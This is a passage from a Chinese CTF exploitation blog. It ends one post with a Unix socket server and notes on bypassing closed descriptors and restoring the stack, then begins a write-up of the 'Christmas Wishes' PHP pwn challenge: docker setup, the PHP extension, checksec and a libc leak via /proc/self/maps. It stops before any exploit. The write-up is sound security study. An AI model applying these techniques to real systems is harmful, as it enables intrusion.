</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span>   </span></span><br><span class="line">   </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAN_SERVICE <span class="meta-string">&quot;B&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;      </span><br><span class="line">    <span class="keyword">int</span> ret;     </span><br><span class="line">    <span class="keyword">int</span> len;  </span><br><span class="line">    <span class="keyword">int</span> accept_fd;</span><br><span class="line">    <span class="keyword">int</span> socket_fd; </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> recv_buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> clt_addr_len; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">clt_addr</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">srv_addr</span>;</span>  </span><br><span class="line"></span><br><span class="line">    socket_fd=socket(PF_UNIX,SOCK_STREAM,<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(socket_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot create communication socket&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;    </span><br><span class="line">          </span><br><span class="line">    <span class="comment">// 设置服务器参数  </span></span><br><span class="line">    srv_addr.sun_family=AF_UNIX;  </span><br><span class="line">    <span class="built_in">strncpy</span>(srv_addr.sun_path,CAN_SERVICE,<span class="keyword">sizeof</span>(srv_addr.sun_path)<span class="number">-1</span>);  </span><br><span class="line">    unlink(CAN_SERVICE);  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 绑定socket地址 </span></span><br><span class="line">    ret=bind(socket_fd,(struct sockaddr*)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot bind server socket&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 监听   </span></span><br><span class="line">    ret=listen(socket_fd,<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot listen the client connect request&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 接受connect请求 </span></span><br><span class="line">    len=<span class="keyword">sizeof</span>(clt_addr);  </span><br><span class="line">    accept_fd=accept(socket_fd,(struct sockaddr*)&amp;clt_addr,&amp;len);  </span><br><span class="line">    <span class="keyword">if</span>(accept_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot accept client connect request&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 读取和写入  </span></span><br><span class="line">    <span class="built_in">memset</span>(recv_buf,<span class="number">0</span>,<span class="number">1024</span>);  </span><br><span class="line">    <span class="keyword">int</span> num=read(accept_fd,recv_buf,<span class="keyword">sizeof</span>(recv_buf));  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message from client (%d)) :%s\n&quot;</span>,num,recv_buf);    </span><br><span class="line">         </span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    close(accept_fd);  </span><br><span class="line">    close(socket_fd);  </span><br><span class="line">    unlink(CAN_SERVICE);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x40128a</span> &lt;main+<span class="number">148</span>&gt;    call   bind@plt                      &lt;bind@plt&gt;</span><br><span class="line">       fd: <span class="number">0x3</span> (socket:[<span class="number">162182</span>])</span><br><span class="line">       addr: <span class="number">0x7fffffffde00</span> ◂— <span class="number">0x420001</span> <span class="comment">// serv_addr </span></span><br><span class="line">       len: <span class="number">0x6e</span></span><br></pre></td></tr></table></figure>
<ul>
<li>保证 bind 的 <code>serv_addr</code> 和 SYS_connect 的一样就可以了</li>
</ul>
<hr>
<p><strong>小结：</strong></p>
<p>当时很坐牢，百思不得其解，赛后复现时才发现自己的知识点不到位，看了大佬们的 wp 后收获很多：</p>
<ul>
<li><code>mov rsp, fs:[0x300]</code> 这条指令可以恢复栈（fs 寄存器中装有 TLS）</li>
<li>利用 socket 本地进程间通信来绕过 close</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">PHP pwn环境搭建+so文件的调试</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-06 13:31:51" itemprop="dateCreated datePublished" datetime="2022-07-06T13:31:51+08:00">2022-07-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-09-02 09:34:22" itemprop="dateModified" datetime="2022-09-02T09:34:22+08:00">2022-09-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Christmas Wishes 复现</strong></p>
<p>这是个 PHP pwn，环境折腾了我一个下午（主要是 docker 的问题）</p>
<p>在 docker 文件夹下运行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1656684619344.png" alt="1656684619344"> </p>
<p>直接访问 <code>http://localhost:7777</code> 就可以了：</p>
<p><img src="/2022/07/06/PHP%20pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+so%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95/1656684673290.png" alt="1656684673290"> </p>
<ul>
<li>有一次输入的机会</li>
</ul>
<p>下面是题目给我们的文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\Desktop\<span class="number">2022</span>暑假复现\ChristmasWishes\file2ctfer&gt;tree /F</span><br><span class="line">卷 OS 的文件夹 PATH 列表</span><br><span class="line">卷序列号为 <span class="number">1</span>AD1<span class="number">-822</span>C</span><br><span class="line">C:.</span><br><span class="line">│  docker-compose.yml</span><br><span class="line">│</span><br><span class="line">├─fpm</span><br><span class="line">│  │  Dockerfile</span><br><span class="line">│  │  flag</span><br><span class="line">│  │  jsonparser.so</span><br><span class="line">│  │  readflag</span><br><span class="line">│  │  start.sh</span><br><span class="line">│  │</span><br><span class="line">│  └─html</span><br><span class="line">│          index.php</span><br><span class="line">│          test.php</span><br><span class="line">│</span><br><span class="line">└─nginx</span><br><span class="line">    │  Dockerfile</span><br><span class="line">    │  nginx.conf</span><br><span class="line">    │  pwn.conf</span><br><span class="line">    │</span><br><span class="line">    └─<span class="keyword">static</span></span><br><span class="line">        │  index.html</span><br><span class="line">        │  style.css</span><br><span class="line">        │</span><br><span class="line">        ├─css</span><br><span class="line">        │      animate.css</span><br><span class="line">        │      bootstrap-theme.css</span><br><span class="line">        │      bootstrap-theme.min.css</span><br><span class="line">        │      bootstrap.css</span><br><span class="line">        │      bootstrap.min.css</span><br><span class="line">        │      colors.css</span><br><span class="line">        │      custom.css</span><br><span class="line">        │      flaticon.css</span><br><span class="line">        │      font-awesome.css</span><br><span class="line">        │      font-awesome.min.css</span><br><span class="line">        │      owl.carousel.css</span><br><span class="line">        │      prettyPhoto.css</span><br><span class="line">        │      responsive.css</span><br><span class="line">        │      versions.css</span><br><span class="line">        │</span><br><span class="line">        ├─fonts</span><br><span class="line">        │      flaticon.css</span><br><span class="line">        │      Flaticon.eot</span><br><span class="line">        │      flaticon.html</span><br><span class="line">        │      Flaticon.svg</span><br><span class="line">        │      Flaticon.ttf</span><br><span class="line">        │      Flaticon.woff</span><br><span class="line">        │      fontawesome-webfont.eot</span><br><span class="line">        │      fontawesome-webfont.svg</span><br><span class="line">        │      fontawesome-webfont.ttf</span><br><span class="line">        │      fontawesome-webfont.woff</span><br><span class="line">        │      fontawesome-webfont.woff2</span><br><span class="line">        │      FontAwesome.otf</span><br><span class="line">        │      glyphicons-halflings-regular.eot</span><br><span class="line">        │      glyphicons-halflings-regular.svg</span><br><span class="line">        │      glyphicons-halflings-regular.ttf</span><br><span class="line">        │      glyphicons-halflings-regular.woff</span><br><span class="line">        │      glyphicons-halflings-regular.woff2</span><br><span class="line">        │      _flaticon.scss</span><br><span class="line">        │</span><br><span class="line">        ├─images</span><br><span class="line">        │  │  ajax-loader.gif</span><br><span class="line">        │  │</span><br><span class="line">        │  └─prettyPhoto</span><br><span class="line">        │      ├─dark_rounded</span><br><span class="line">        │      │      btnNext.png</span><br><span class="line">        │      │      btnPrevious.png</span><br><span class="line">        │      │      contentPattern.png</span><br><span class="line">        │      │      default_thumbnail.gif</span><br><span class="line">        │      │      loader.gif</span><br><span class="line">        │      │      sprite.png</span><br><span class="line">        │      │</span><br><span class="line">        │      ├─dark_square</span><br><span class="line">        │      │      btnNext.png</span><br><span class="line">        │      │      btnPrevious.png</span><br><span class="line">        │      │      contentPattern.png</span><br><span class="line">        │      │      default_thumbnail.gif</span><br><span class="line">        │      │      loader.gif</span><br><span class="line">        │      │      sprite.png</span><br><span class="line">        │      │</span><br><span class="line">        │      ├─<span class="keyword">default</span></span><br><span class="line">        │      │      default_thumb.png</span><br><span class="line">        │      │      loader.gif</span><br><span class="line">        │      │      sprite.png</span><br><span class="line">        │      │      sprite_next.png</span><br><span class="line">        │      │      sprite_prev.png</span><br><span class="line">        │      │      sprite_x.png</span><br><span class="line">        │      │      sprite_y.png</span><br><span class="line">        │      │</span><br><span class="line">        │      ├─facebook</span><br><span class="line">        │      │      btnNext.png</span><br><span class="line">        │      │      btnPrevious.png</span><br><span class="line">        │      │      contentPatternBottom.png</span><br><span class="line">        │      │      contentPatternLeft.png</span><br><span class="line">        │      │      contentPatternRight.png</span><br><span class="line">        │      │      contentPatternTop.png</span><br><span class="line">        │      │      default_thumbnail.gif</span><br><span class="line">        │      │      loader.gif</span><br><span class="line">        │      │      sprite.png</span><br><span class="line">        │      │</span><br><span class="line">        │      ├─light_rounded</span><br><span class="line">        │      │      btnNext.png</span><br><span class="line">        │      │      btnPrevious.png</span><br><span class="line">        │      │      default_thumbnail.gif</span><br><span class="line">        │      │      loader.gif</span><br><span class="line">        │      │      sprite.png</span><br><span class="line">        │      │</span><br><span class="line">        │      └─light_square</span><br><span class="line">        │              btnNext.png</span><br><span class="line">        │              btnPrevious.png</span><br><span class="line">        │              default_thumbnail.gif</span><br><span class="line">        │              loader.gif</span><br><span class="line">        │              sprite.png</span><br><span class="line">        │</span><br><span class="line">        ├─imgs</span><br><span class="line">        │      banner1.png</span><br><span class="line">        │      fevicon.png</span><br><span class="line">        │      loading.gif</span><br><span class="line">        │</span><br><span class="line">        └─js</span><br><span class="line">                all.js</span><br><span class="line">                animate.js</span><br><span class="line">                custom.js</span><br><span class="line">                hoverdir.js</span><br><span class="line">                jquery.prettyPhoto.js</span><br><span class="line">                jquery.vide.js</span><br><span class="line">                <span class="built_in">map</span>.js</span><br><span class="line">                modernizer.js</span><br><span class="line">                owl.carousel.js</span><br><span class="line">                portfolio.js</span><br><span class="line">                retina.js</span><br><span class="line">                scroll.js</span><br></pre></td></tr></table></figure>
<p>通过 Dockerfile 可以获取远程环境的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  fpm cat Dockerfile         </span><br><span class="line">FROM php:<span class="number">7.4</span>-fpm</span><br><span class="line"></span><br><span class="line">RUN sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apt/sources.<span class="built_in">list</span> &amp;&amp;\</span><br><span class="line">    apt-get update</span><br><span class="line"></span><br><span class="line">COPY html /var/www/html</span><br><span class="line">COPY flag /flag</span><br><span class="line">COPY readflag where_is_your_gift</span><br><span class="line">COPY jsonparser.so /usr/local/lib/php/extensions/no-debug-non-zts<span class="number">-20190902</span>/jsonparser.so</span><br><span class="line"></span><br><span class="line">RUN chmod <span class="number">400</span> /flag &amp;&amp;\</span><br><span class="line">    chmod <span class="number">4111</span> where_is_your_gift &amp;&amp;\</span><br><span class="line">    chmod -R <span class="number">555</span> /var/www/html &amp;&amp;\</span><br><span class="line">    echo <span class="string">&quot;extension=/usr/local/lib/php/extensions/no-debug-non-zts-20190902/jsonparser.so&quot;</span> &gt; /usr/local/etc/php/conf.d/jsonparser.ini% </span><br></pre></td></tr></table></figure>
<ul>
<li>7.4 版本的 php</li>
<li>在 fpm 中有一个 jsonparser.so</li>
</ul>
<p><strong>PHP 扩展的相关知识</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013756836/article/details/106688783#:~:text=PHP中扩展通过zend_module_entry这个结构来表示，此结构定义了扩展的全部信息：扩展名、扩展版本、扩展提供的函数列表以及PHP四个执行阶段的hook函数等，每一个扩展都需要定义一个此结构的变量，而且这个变量的名称格式必须是：,{module_name}_module_entry，内核正是通过这个结构获取到扩展提供的功能的。">【走进php内核】之扩展的实现原理</a> </li>
</ul>
<p>PHP 是一种脚本语言，需要用解释器 php-cgi（c 语言写的）才能完成底层的工作，其核心就是对 PHP 字符的处理，而 PHP 扩展就是增强 PHP 语言功能的插件</p>
<p>PHP 提供了编程语言的语法，比如分支、循环、函数、类等，这些是 PHP 本身所提供的，在某些情况下需要在 PHP 语言的基础上进行扩展，那么就需要通过 PHP 底层提供的数据结构和接口来开发 PHP 扩展，从而来补充或扩展 PHP 语言，使之更加的强大</p>
<ul>
<li>PHP pwn 的漏洞往往就在 PHP 扩展中</li>
</ul>
<p>PHP 中扩展通过 zend_module_entry 这个结构来表示，此结构定义了扩展的全部信息：</p>
<ul>
<li>扩展名</li>
<li>扩展版本</li>
<li>扩展提供的函数列表</li>
<li>PHP 四个执行阶段的 hook 函数</li>
</ul>
<p>每一个扩展都需要定义一个此结构的变量，而且这个变量的名称格式必须是：</p>
<ul>
<li>{module_name}_module_entry（内核正是通过这个结构获取到扩展提供的功能的）</li>
</ul>
<p>扩展可以在编译 PHP 时一起编译(静态编译)，也可以单独编译为动态库，动态库需要加入到 php.ini 配置中去，然后在 php_module_startup() 阶段把这些动态库加载到 PHP 中 </p>
<ul>
<li>关于 php.ini 的配置可以参考这篇博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lgx1134569285/article/details/80655958">php.ini 配置扩展</a> </li>
</ul>
<p>在 Dockerfile 中可以看到 jsonparser.so 就是题目环境的 PHP 扩展模块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COPY jsonparser.so /usr/local/lib/php/extensions/no-debug-non-zts<span class="number">-20190902</span>/jsonparser.so</span><br></pre></td></tr></table></figure>
<ul>
<li>可以用 IDA 分析 jsonparser.so</li>
</ul>
<p>关于 PHP pwn 可以先学习：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1176.html#:~:text=WEBPWN类型,m是不太可行的。">WEBPWN入门级调试讲解_红帽社区</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235237#h2-0">WebPwn：php-pwn学习 - 安全客</a> </li>
</ul>
<p>先 checksec jsonparser.so：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>保护全开</li>
</ul>
<p><strong>尝试直接用题目所给的 .so 来进行调试</strong></p>
<p>将 jsonparser.so 放入本地 <code>php</code> 拓展库路径下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 php -i | grep -i extension_dir</span><br><span class="line">extension_dir =&gt; /usr/lib/php/<span class="number">20190902</span> =&gt; /usr/lib/php/<span class="number">20190902</span></span><br></pre></td></tr></table></figure>
<p>随后在 <code>php.ini</code> 配置文件的末尾，添加如下代码： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extensions=jsonparser.so</span><br></pre></td></tr></table></figure>
<p>可以用 find 命令来查找 <code>php.ini</code> 的位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ChristmasWishes sudo find / -name <span class="string">&quot;php.ini&quot;</span></span><br><span class="line">/etc/php/<span class="number">7.4</span>/cli/php.ini</span><br><span class="line">/etc/php/<span class="number">7.4</span>/fpm/php.ini</span><br></pre></td></tr></table></figure>
<p>预计效果：（”phppwn” 是本地测试模块）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ChristmasWishes php test.php | grep <span class="string">&quot;phppwn&quot;</span>    </span><br><span class="line">phppwn</span><br><span class="line">phppwn support =&gt; enabled</span><br><span class="line">➜  ChristmasWishes php test.php | grep <span class="string">&quot;jsonparser&quot;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>很可惜没有出现预期结果，可能是 php 版本的原因</li>
<li>如果加载成功，就可以直接通过 <code>gdb php</code> 来调试 .so 文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555627000</span> r--p    d3000 <span class="number">0</span>      /usr/bin/php7<span class="number">.4</span></span><br><span class="line">    <span class="number">0x555555627000</span>     <span class="number">0x55555588f000</span> r-xp   <span class="number">268000</span> d3000  /usr/bin/php7<span class="number">.4</span></span><br><span class="line">    <span class="number">0x55555588f000</span>     <span class="number">0x555555955000</span> r--p    c6000 <span class="number">33b</span>000 /usr/bin/php7<span class="number">.4</span></span><br><span class="line">    <span class="number">0x555555955000</span>     <span class="number">0x5555559e0000</span> r--p    <span class="number">8b</span>000 <span class="number">400000</span> /usr/bin/php7<span class="number">.4</span></span><br><span class="line">    <span class="number">0x5555559e0000</span>     <span class="number">0x5555559e2000</span> rw-p     <span class="number">2000</span> <span class="number">48b</span>000 /usr/bin/php7<span class="number">.4</span></span><br><span class="line">    <span class="number">0x5555559e2000</span>     <span class="number">0x555555b9c000</span> rw-p   <span class="number">1b</span>a000 <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ffff41c0000</span>     <span class="number">0x7ffff4241000</span> rw-p    <span class="number">81000</span> <span class="number">0</span>      [anon_7ffff41c0]</span><br><span class="line">    ......</span><br><span class="line"> /usr/lib/php/<span class="number">20190902</span>/phppwn.so</span><br><span class="line">    <span class="number">0x7ffff7fc5000</span>     <span class="number">0x7ffff7fc6000</span> r-xp     <span class="number">1000</span> <span class="number">1000</span>   /usr/lib/php/<span class="number">20190902</span>/phppwn.so</span><br><span class="line">    <span class="number">0x7ffff7fc6000</span>     <span class="number">0x7ffff7fc7000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /usr/lib/php/<span class="number">20190902</span>/phppwn.so</span><br><span class="line">    <span class="number">0x7ffff7fc7000</span>     <span class="number">0x7ffff7fc8000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /usr/lib/php/<span class="number">20190902</span>/phppwn.so</span><br><span class="line">    <span class="number">0x7ffff7fc8000</span>     <span class="number">0x7ffff7fc9000</span> rw-p     <span class="number">1000</span> <span class="number">3000</span>   /usr/lib/php/<span class="number">20190902</span>/phppwn.so</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现：样例 phppwn.so 已经成功加载进去了（但是 jsonparser.so 没有加载）</li>
</ul>
<p><strong>利用 dlsym 进行调试</strong></p>
<p>参考了以下博客：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jeff_Dean/article/details/106464499">dlsym用法</a></li>
</ul>
<p>dlsym：从一个动态链接库或者可执行文件中获取到符号地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">dlsym</span><span class="params">(<span class="keyword">void</span> *handle, <span class="keyword">const</span> <span class="keyword">char</span> *symbol)</span></span>;</span><br><span class="line"><span class="comment">/* Link with -ldl */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>handle 参数：一个指向已经加载的动态目标的句柄，这个句柄可以是 dlopen() 函数返回的</li>
<li>symbol 参数：是一个以 null 结尾的符号名</li>
<li>返回：符号对应的地址</li>
</ul>
<p>把某个地址存入函数指针，就可以执行这个函数了，通过这种方式就可以执行并调试有漏洞的函数</p>
<p><strong>信息收集：远程</strong></p>
<p>进入容器内部：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND                  CREATED        STATUS              PORTS                                   NAMES</span><br><span class="line"><span class="number">177162</span>d1fe91   docker_nginx   <span class="string">&quot;/docker-entrypoint.…&quot;</span>   <span class="number">24</span> hours ago   Up About a minute   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">7777</span>-&gt;<span class="number">80</span>/tcp, :::<span class="number">7777</span>-&gt;<span class="number">80</span>/tcp   docker_nginx_1</span><br><span class="line"><span class="number">18b</span>7ee65e760   docker_fpm     <span class="string">&quot;docker-php-entrypoi…&quot;</span>   <span class="number">24</span> hours ago   Up About a minute   <span class="number">9000</span>/tcp                                docker_fpm_1</span><br><span class="line">➜  桌面 docker exec -it <span class="number">18b</span>7ee65e760 /bin/bash</span><br><span class="line">root@<span class="number">18b</span>7ee65e760:/var/www/html<span class="meta"># ls</span></span><br></pre></td></tr></table></figure>
<p>执行 <code>/proc/self/maps</code> 获取远程 libc_base：</p>
